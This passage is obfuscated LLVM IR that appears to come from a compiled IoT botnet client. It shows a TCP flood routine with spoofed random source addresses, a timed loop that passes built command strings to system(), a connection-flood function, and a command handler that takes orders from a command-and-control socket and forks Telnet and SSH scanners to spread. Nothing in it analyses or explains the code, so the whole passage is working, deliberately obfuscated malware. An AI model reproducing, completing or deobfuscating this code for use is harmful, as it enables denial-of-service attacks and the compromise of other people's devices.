  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i64 @time(i64* null) #2
  %291 = load i32, i32* %10, align 4
  %292 = sext i32 %291 to i64
  %293 = add nsw i64 %290, %292
  %294 = trunc i64 %293 to i32
  store i32 %294, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 347368866, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1270608715, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i32, i32* %17, align 4
  %298 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %299 = call i64 @sendto(i32 %297, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %298, i32 16)
  %300 = load i32, i32* %19, align 4
  %301 = call i32 @getRandomIP(i32 %300)
  %302 = call i32 @htonl(i32 %301) #13
  %303 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 8
  store i32 %302, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 3
  store i16 %306, i16* %308, align 4
  %309 = call i32 @rand_cmwc()
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon.0* %311 to %struct.anon.1*
  %313 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %312, i32 0, i32 2
  store i32 %309, i32* %313, align 4
  %314 = call i32 @rand_cmwc()
  %315 = trunc i32 %314 to i16
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon.0* %317 to %struct.anon.1*
  %319 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %318, i32 0, i32 0
  store i16 %315, i16* %319, align 4
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.0* %321 to %struct.anon.1*
  %323 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %322, i32 0, i32 6
  store i16 0, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = call zeroext i16 @tcpcsum(%struct.iphdr* %324, %struct.tcphdr* %325)
  %327 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 0
  %329 = bitcast %union.anon.0* %328 to %struct.anon.1*
  %330 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %329, i32 0, i32 6
  store i16 %326, i16* %330, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %331 = bitcast i8* %.reload6 to i16*
  %332 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 2
  %334 = load i16, i16* %333, align 2
  %335 = zext i16 %334 to i32
  %336 = call zeroext i16 @csum(i16* %331, i32 %335)
  %337 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 7
  store i16 %336, i16* %338, align 2
  %339 = load i32, i32* %25, align 4
  %340 = load i32, i32* %15, align 4
  %341 = icmp eq i32 %339, %340
  %342 = select i1 %341, i32 160118851, i32 -604030924
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = call i64 @time(i64* null) #2
  %345 = load i32, i32* %24, align 4
  %346 = sext i32 %345 to i64
  %347 = icmp sgt i64 %344, %346
  %348 = select i1 %347, i32 -1991793674, i32 -1895381133
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  store i32 1852483953, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 347368866, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i32, i32* %25, align 4
  %353 = add i32 %352, 1
  store i32 %353, i32* %25, align 4
  store i32 347368866, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %355)
  store i32 683644618, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %354, %351, %350, %349, %343, %296, %295, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i64 @time(i64* null) #2
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = add nsw i64 %9, %11
  %13 = trunc i64 %12 to i32
  store i32 %13, i32* %5, align 4
  %14 = call i32 @rand() #2
  %15 = sext i32 %14 to i64
  %16 = urem i64 %15, 23
  %17 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %16
  %18 = load i8*, i8** %17, align 8
  store i8* %18, i8** %7, align 8
  %19 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %20 = bitcast i8** %19 to i8*
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %20, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %22 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %23 = bitcast i8** %22 to i8*
  %24 = load i8*, i8** %7, align 8
  %25 = call i8* @strcat(i8* %23, i8* %24) #2
  %26 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %27 = bitcast i8** %26 to i8*
  %28 = call i8* @strcat(i8* %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %29 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %30 = bitcast i8** %29 to i8*
  %31 = load i8*, i8** %3, align 8
  %32 = call i8* @strcat(i8* %30, i8* %31) #2
  %switchVar = alloca i32
  store i32 -151774613, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -151774613, label %33
    i32 -458449257, label %39
    i32 263474354, label %62
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = call i64 @time(i64* null) #2
  %37 = icmp sgt i64 %35, %36
  %38 = select i1 %37, i32 -458449257, i32 263474354
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand() #2
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 23
  %43 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %7, align 8
  %45 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %46 = bitcast i8** %45 to i8*
  %47 = call i32 (i8*, i8*, ...) @sprintf(i8* %46, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %48 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %49 = bitcast i8** %48 to i8*
  %50 = load i8*, i8** %7, align 8
  %51 = call i8* @strcat(i8* %49, i8* %50) #2
  %52 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %53 = bitcast i8** %52 to i8*
  %54 = call i8* @strcat(i8* %53, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %55 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %56 = bitcast i8** %55 to i8*
  %57 = load i8*, i8** %3, align 8
  %58 = call i8* @strcat(i8* %56, i8* %57) #2
  %59 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %60 = bitcast i8** %59 to i8*
  %61 = call i32 @system(i8* %60)
  store i32 -151774613, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i64 @time(i64* null) #2
  %11 = load i32, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = add nsw i64 %10, %12
  %14 = trunc i64 %13 to i32
  store i32 %14, i32* %7, align 4
  %15 = load i8*, i8** %4, align 8
  %16 = call i32 @inet_addr(i8* %15) #2
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = load i32, i32* %5, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %switchVar = alloca i32
  store i32 1678331628, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1678331628, label %24
    i32 1113633947, label %30
    i32 -1068194517, label %38
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call i64 @time(i64* null) #2
  %28 = icmp sgt i64 %26, %27
  %29 = select i1 %28, i32 1113633947, i32 -1068194517
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %31, i32* %8, align 4
  %32 = load i32, i32* %8, align 4
  %33 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  %35 = call i32 @sleep(i32 1)
  %36 = load i32, i32* %8, align 4
  %37 = call i32 @close(i32 %36)
  store i32 1678331628, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %30, %24, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  store i32 %41, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -604564787, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -604564787, label %first
    i32 275274447, label %44
    i32 1667587303, label %47
    i32 -849155869, label %54
    i32 1827496530, label %59
    i32 18072915, label %66
    i32 1985013847, label %70
    i32 186616543, label %73
    i32 -1569258813, label %80
    i32 860576449, label %84
    i32 -1690251308, label %85
    i32 1531151487, label %96
    i32 500499669, label %100
    i32 -1042767736, label %101
    i32 -1281712802, label %108
    i32 2079006735, label %110
    i32 1086903846, label %114
    i32 264287822, label %115
    i32 -1729759504, label %116
    i32 1180976910, label %117
    i32 -156347891, label %124
    i32 328393137, label %128
    i32 139323405, label %129
    i32 -229480557, label %136
    i32 108671968, label %138
    i32 477157757, label %142
    i32 279695344, label %143
    i32 -1510782972, label %144
    i32 -1329448006, label %145
    i32 -935146350, label %146
    i32 453566960, label %147
    i32 568623374, label %154
    i32 -164357525, label %158
    i32 -704123925, label %165
    i32 -1805437160, label %172
    i32 -1879536419, label %179
    i32 -1295943027, label %186
    i32 1263868484, label %193
    i32 1595125829, label %200
    i32 37846540, label %204
    i32 1377603253, label %211
    i32 -861199428, label %212
    i32 1393213747, label %235
    i32 167894555, label %240
    i32 1975852827, label %241
    i32 1751502761, label %246
    i32 1903887195, label %249
    i32 864123156, label %253
    i32 1732192695, label %257
    i32 -339160266, label %264
    i32 -874330567, label %266
    i32 1538565360, label %267
    i32 832664683, label %271
    i32 -2023762369, label %272
    i32 671092482, label %279
    i32 -1556906766, label %280
    i32 231612662, label %287
    i32 62071220, label %291
    i32 -1971302390, label %298
    i32 -1868043526, label %305
    i32 1357453898, label %312
    i32 -1525351705, label %319
    i32 1604498850, label %323
    i32 -330895269, label %330
    i32 -430203588, label %334
    i32 88335829, label %341
    i32 -1903217845, label %342
    i32 -465647468, label %364
    i32 1118036828, label %369
    i32 2120501471, label %370
    i32 -1458213178, label %374
    i32 -1200312695, label %379
    i32 1329446279, label %380
    i32 -2136080305, label %385
    i32 896828621, label %388
    i32 -613667083, label %392
    i32 -364028471, label %396
    i32 -1562915316, label %404
    i32 1842861861, label %406
    i32 497344505, label %407
    i32 -1752533682, label %411
    i32 -896646360, label %412
    i32 2033484678, label %420
    i32 -1674602734, label %421
    i32 594828245, label %428
    i32 -769159749, label %432
    i32 406001836, label %439
    i32 -1821664419, label %440
    i32 -927822018, label %452
    i32 -580572965, label %455
    i32 435493501, label %459
    i32 1380406295, label %463
    i32 -1988062338, label %464
    i32 -567718053, label %468
    i32 316530829, label %473
    i32 830573973, label %476
    i32 1457918520, label %478
    i32 142960752, label %479
    i32 -1503266482, label %483
    i32 1458267936, label %484
    i32 1219123281, label %485
    i32 1840458343, label %489
    i32 -413597161, label %494
    i32 -1385960541, label %497
    i32 -917065137, label %498
    i32 -1427850751, label %505
    i32 -1678683620, label %509
    i32 -2011120831, label %516
    i32 -625334240, label %523
    i32 -742586564, label %524
    i32 33908432, label %540
    i32 -751523081, label %543
    i32 -2022922031, label %547
    i32 -616709661, label %551
    i32 1460690960, label %557
    i32 -1652481809, label %559
    i32 -1613410535, label %560
    i32 -1626590505, label %564
    i32 407663619, label %565
    i32 1844628151, label %569
    i32 -880581875, label %570
    i32 -95583410, label %577
    i32 -2141465057, label %581
    i32 842109040, label %588
    i32 -1688097553, label %595
    i32 613304421, label %596
    i32 -1130962762, label %612
    i32 744393519, label %615
    i32 94822463, label %619
    i32 -341261731, label %623
    i32 -1981954200, label %627
    i32 -1169049215, label %629
    i32 -1472322160, label %630
    i32 -899161065, label %634
    i32 1421328689, label %635
    i32 -959556403, label %639
    i32 -541256084, label %640
    i32 -1111769928, label %647
    i32 1348410209, label %648
    i32 -580121534, label %653
    i32 1018754693, label %660
    i32 1815151557, label %668
    i32 -2063639596, label %676
    i32 1363962043, label %677
    i32 -194849087, label %680
    i32 957960114, label %684
    i32 1803490533, label %685
    i32 887403360, label %686
    i32 1293006597, label %687
    i32 927407855, label %694
    i32 -828258347, label %695
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %42 = icmp ne i32 %.reload, 0
  %43 = select i1 %42, i32 1667587303, i32 275274447
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = call i32 (i32, i8*, ...) @sockprintf(i32 %45, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0))
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1827496530, i32 -849155869
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i8* @inet_ntoa(i32 %56) #2
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i32 0, i32 0), i8* %57)
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 0
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i32 0, i32 0)) #10
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 453566960, i32 18072915
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %3, align 4
  %68 = icmp ne i32 %67, 2
  %69 = select i1 %68, i32 1985013847, i32 186616543
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i32 0, i32 0))
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8**, i8*** %4, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strcmp(i8* %76, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i32 0, i32 0)) #10
  %78 = icmp ne i32 %77, 0
  %79 = select i1 %78, i32 -935146350, i32 -1569258813
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* @scanPid, align 4
  %82 = icmp eq i32 %81, 0
  %83 = select i1 %82, i32 860576449, i32 -1690251308
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i32 0, i32 0))
  %88 = load i32, i32* @scanPid, align 4
  %89 = call i32 @kill(i32 %88, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  %95 = select i1 %94, i32 1180976910, i32 1531151487
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @scanPid, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 500499669, i32 -1042767736
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 @fork() #2
  store i32 %102, i32* %6, align 4
  %103 = load i32, i32* @mainCommSock, align 4
  %104 = call i32 (i32, i8*, ...) @sockprintf(i32 %103, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i32 0, i32 0))
  %105 = load i32, i32* %6, align 4
  %106 = icmp ugt i32 %105, 0
  %107 = select i1 %106, i32 -1281712802, i32 2079006735
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %6, align 4
  store i32 %109, i32* @scanPid, align 4
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %6, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 1086903846, i32 264287822
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 -1729759504, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8**, i8*** %4, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 1
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @strcmp(i8* %120, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0)) #10
  %122 = icmp ne i32 %121, 0
  %123 = select i1 %122, i32 -1329448006, i32 -156347891
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* @scanPid, align 4
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 328393137, i32 139323405
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 @fork() #2
  store i32 %130, i32* %7, align 4
  %131 = load i32, i32* @mainCommSock, align 4
  %132 = call i32 (i32, i8*, ...) @sockprintf(i32 %131, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i32 0, i32 0))
  %133 = load i32, i32* %7, align 4
  %134 = icmp ugt i32 %133, 0
  %135 = select i1 %134, i32 -229480557, i32 108671968
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %7, align 4
  store i32 %137, i32* @scanPid, align 4
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i32, i32* %7, align 4
  %140 = icmp eq i32 %139, -1
  %141 = select i1 %140, i32 477157757, i32 279695344
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 -1510782972, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  call void (i32, ...) bitcast (void ()* @SSHScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:145:                                    ; preds = %loopEntry
  store i32 -935146350, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 453566960, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8**, i8*** %4, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 0
  %150 = load i8*, i8** %149, align 8
  %151 = call i32 @strcmp(i8* %150, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %152 = icmp ne i32 %151, 0
  %153 = select i1 %152, i32 -1556906766, i32 568623374
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %3, align 4
  %156 = icmp slt i32 %155, 6
  %157 = select i1 %156, i32 1377603253, i32 -164357525
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8**, i8*** %4, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 3
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 @atoi(i8* %161) #10
  %163 = icmp eq i32 %162, -1
  %164 = select i1 %163, i32 1377603253, i32 -704123925
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i8**, i8*** %4, align 8
  %167 = getelementptr inbounds i8*, i8** %166, i64 2
  %168 = load i8*, i8** %167, align 8
  %169 = call i32 @atoi(i8* %168) #10
  %170 = icmp eq i32 %169, -1
  %171 = select i1 %170, i32 1377603253, i32 -1805437160
  store i32 %171, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp eq i32 %176, -1
  %178 = select i1 %177, i32 1377603253, i32 -1879536419
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 5
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #10
  %184 = icmp eq i32 %183, -1
  %185 = select i1 %184, i32 1377603253, i32 -1295943027
